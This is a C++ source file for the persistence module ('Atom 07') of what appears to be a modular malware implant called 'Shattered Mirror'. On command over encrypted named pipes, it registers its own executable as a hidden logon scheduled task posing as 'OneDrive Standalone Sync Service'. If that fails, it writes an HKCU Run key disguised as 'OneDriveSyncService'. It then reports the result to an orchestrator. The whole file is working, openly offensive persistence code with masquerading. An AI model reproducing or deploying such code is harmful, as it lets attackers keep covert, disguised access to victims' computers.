/*=============================================================================
 * Shattered Mirror v1 — Atom 07: COM Task Persistence
 *===========================================================================*/

#include "Atom_07_Persist.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <comdef.h>
#include <cstdio>
#include <taskschd.h>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

static void PersistDebug(const char *format, ...) {
    if (!Config::LOGGING_ENABLED) return;
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    FILE *f = fopen("log\\persist_debug.txt", "a");
    if (f) { fprintf(f, "[%lu] %s\n", GetTickCount(), buf); fclose(f); }
}

BOOL InstallHKCUPersistence(LPCWSTR pwszExePath) {
    HKEY hKey;
    LONG res = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                               0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (res == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"OneDriveSyncService", 0, REG_SZ, (const BYTE*)pwszExePath, (DWORD)(wcslen(pwszExePath) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

HRESULT CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
  HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
  if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
    return hr;

  hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                            RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);

  if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
    CoUninitialize();
    return hr;
  }

  ITaskService *pService = NULL;
  hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                        IID_ITaskService, (void **)&pService);
  if (FAILED(hr)) {
    CoUninitialize();
    return hr;
  }

  hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
  if (FAILED(hr)) {
    pService->Release();
    CoUninitialize();
    return hr;
  }

  ITaskFolder *pRootFolder = NULL;
  hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
  if (FAILED(hr)) {
    pService->Release();
    CoUninitialize();
    return hr;
  }

  pRootFolder->DeleteTask(_bstr_t(pwszTaskName), 0);

  ITaskDefinition *pTask = NULL;
  hr = pService->NewTask(0, &pTask);
  pService->Release();
  if (FAILED(hr)) {
    pRootFolder->Release();
    CoUninitialize();
    return hr;
  }

  ITriggerCollection *pTriggerCollection = NULL;
  hr = pTask->get_Triggers(&pTriggerCollection);
  if (SUCCEEDED(hr)) {
    ITrigger *pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
    if (SUCCEEDED(hr)) {
      ILogonTrigger *pLogonTrigger = NULL;
      hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void **)&pLogonTrigger);
      if (SUCCEEDED(hr)) {
        pLogonTrigger->Release();
      }
      pTrigger->Release();
    }
    pTriggerCollection->Release();
  }

  IActionCollection *pActionCollection = NULL;
  hr = pTask->get_Actions(&pActionCollection);
  if (SUCCEEDED(hr)) {
    IAction *pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    if (SUCCEEDED(hr)) {
      IExecAction *pExecAction = NULL;
      hr = pAction->QueryInterface(IID_IExecAction, (void **)&pExecAction);
      if (SUCCEEDED(hr)) {
        pExecAction->put_Path(_bstr_t(pwszExecutablePath));
        pExecAction->Release();
      }
      pAction->Release();
    }
    pActionCollection->Release();
  }

  IPrincipal *pPrincipal = NULL;
  hr = pTask->get_Principal(&pPrincipal);
  if (SUCCEEDED(hr)) {
    pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->put_RunLevel(TASK_RUNLEVEL_LUA);
    pPrincipal->Release();
  }

  ITaskSettings *pSettings = NULL;
  hr = pTask->get_Settings(&pSettings);
  if (SUCCEEDED(hr)) {
    pSettings->put_Hidden(VARIANT_TRUE);
    pSettings->put_StartWhenAvailable(VARIANT_TRUE);
    pSettings->Release();
  }

  IRegisteredTask *pRegisteredTask = NULL;
  hr = pRootFolder->RegisterTaskDefinition(
      _bstr_t(pwszTaskName), pTask, TASK_CREATE_OR_UPDATE, _variant_t(),
      _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""),
      &pRegisteredTask);

  if (pRegisteredTask)
    pRegisteredTask->Release();
  pRootFolder->Release();
  pTask->Release();
  CoUninitialize();

  return hr;
}

DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
  PersistDebug("[Init] Persistence Atom %lu starting.", dwAtomId);

  // 1. Connect to command pipe (receive commands)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    PersistDebug("[Fatal] IPC_ConnectToCommandPipe FAILED. Error: %lu", GetLastError());
    return 1;
  }
  PersistDebug("[Init] Command pipe connected.");

  // 2. Connect to report pipe (send reports)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    PersistDebug("[Fatal] IPC_ConnectToReportPipe FAILED. Error: %lu", GetLastError());
    CloseHandle(hCmdPipe);
    return 1;
  }
  PersistDebug("[Init] Report pipe connected.");

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  // Send CMD_READY
  IPC_MESSAGE readyMsg = {0};
  readyMsg.dwSignature = 0x534D4952;
  readyMsg.CommandId = CMD_READY;
  readyMsg.AtomId = dwAtomId;
  readyMsg.dwPayloadLen = 0;
  IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);

  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          PersistDebug("[Exec] Received CMD_EXECUTE.");
          WCHAR szMyPath[MAX_PATH] = {0};
          GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
          PersistDebug("[Exec] Installing persistence for: %ls", szMyPath);
          HRESULT hrResult = CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath);
          if (SUCCEEDED(hrResult)) {
            PersistDebug("[Exec] CreateScheduledTaskCOM SUCCESS.");
            char report[] = "[PERSIST] Scheduled Task COM Installation SUCCESS.";
            IPC_MESSAGE outMsg = {0};
            outMsg.dwSignature = 0x534D4952;
            outMsg.CommandId = CMD_REPORT;
            outMsg.AtomId = dwAtomId;
            outMsg.dwPayloadLen = (DWORD)strlen(report);
            memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
            IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
          } else {
            PersistDebug("[Exec] CreateScheduledTaskCOM FAILED (HR: 0x%08X). Falling back to HKCU Run key...", hrResult);
            if (InstallHKCUPersistence(szMyPath)) {
                PersistDebug("[Exec] HKCU Persistence SUCCESS.");
                char report[] = "[PERSIST] Fallback HKCU Run Key Installation SUCCESS.";
                IPC_MESSAGE outMsg = {0};
                outMsg.dwSignature = 0x534D4952;
                outMsg.CommandId = CMD_REPORT;
                outMsg.AtomId = dwAtomId;
                outMsg.dwPayloadLen = (DWORD)strlen(report);
                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
                IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
            } else {
                PersistDebug("[Exec] HKCU Persistence FAILED.");
                char report[256];
                sprintf_s(report, "[PERSIST] All persistence methods FAILED (COM Error: 0x%08X)", hrResult);
                IPC_MESSAGE outMsg = {0};
                outMsg.dwSignature = 0x534D4952;
                outMsg.CommandId = CMD_REPORT;
                outMsg.AtomId = dwAtomId;
                outMsg.dwPayloadLen = (DWORD)strlen(report);
                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
                IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey, 16);
            }
          }
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          break;
        }
      }
    }
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}